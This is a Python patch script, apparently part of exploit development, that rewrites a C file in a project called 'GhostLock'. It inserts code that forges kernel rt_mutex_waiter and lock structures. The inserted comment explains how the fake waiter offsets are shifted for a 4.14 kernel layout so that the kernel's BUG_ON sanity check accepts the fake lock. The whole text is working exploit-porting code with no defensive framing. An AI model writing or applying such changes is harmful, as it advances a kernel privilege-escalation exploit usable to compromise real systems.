p='/root/02_build/gk3build/GhostLock-main/src/core/util.c'
s=open(p,encoding='utf-8',errors='surrogateescape').read()
old='      put64(p, LOCK_OFF + 0x08, fake_w0 + 0x20);'+chr(10)+'      put64(p, LOCK_OFF + 0x10, fake_w0 + 0x20);'
new=('      {' + chr(10)
     + '        /* 4.14 rt_mutex_waiter has no tree_prio/tree_deadline, so every' + chr(10)
     + '         * FAKE_WAITER_* offset (6.1 layout) sits 0x20 past the real field.' + chr(10)
     + '         * rt_mutex_top_waiter() does rb_entry(rb_leftmost, waiter, tree_entry)' + chr(10)
     + '         * then BUG_ON(w->lock != lock). Pointing rb_leftmost at the true' + chr(10)
     + '         * waiter base (fake_w0+0x20) makes w->lock read fake_w0+0x58 =' + chr(10)
     + '         * fake_lock and satisfies the check. */' + chr(10)
     + '        uintptr_t wbase = fake_w0;' + chr(10)
     + '        if (env_flag("WAITER_BASE_4_14", 0)) wbase = fake_w0 + 0x20;' + chr(10)
     + '        if (chunk == 0) ckpt_val("waiter_base_off", (long)(wbase - fake_w0));' + chr(10)
     + '        put64(p, LOCK_OFF + 0x08, wbase);' + chr(10)
     + '        put64(p, LOCK_OFF + 0x10, wbase);' + chr(10)
     + '      }')
assert old in s, 'anchor not found'
open(p,'w',encoding='utf-8',errors='surrogateescape').write(s.replace(old,new,1))
print('switched to WAITER_BASE_4_14 flag')
